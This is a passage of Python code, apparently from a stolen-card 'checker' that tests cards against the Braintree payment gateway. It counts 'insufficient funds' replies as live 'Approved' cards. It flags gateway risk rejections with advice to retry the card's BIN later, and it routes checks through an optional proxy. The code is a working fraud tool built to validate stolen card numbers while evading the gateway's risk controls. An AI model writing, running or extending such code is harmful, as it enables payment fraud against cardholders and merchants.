        if any(k in data for k in ('Insufficient Funds', 'Funds')):
            return {'Status': 'Approved ✅', 'Response': f'Approved — {status}', 'Card': card}
    if 'insufficient funds' in body_low or 'insufficient_funds' in body_low:
        return {'Status': 'Approved ✅', 'Response': f'Approved — {status}', 'Card': card}
    if 'insufficient' in status_low or 'funds' in status_low:
        return {'Status': 'Approved ✅', 'Response': f'Approved — {status}', 'Card': card}

    if 'risk_threshold' in body_low or 'gateway rejected' in status_low:
        return {'Status': 'Error', 'Response': 'RISK: retry this BIN later', 'Card': card}

    return {'Status': 'Declined ❌', 'Response': str(status)[:80], 'Card': card}

async def check_braintree_auth(card, proxy=None):
    return await asyncio.to_thread(_sync_btauth, card, proxy)
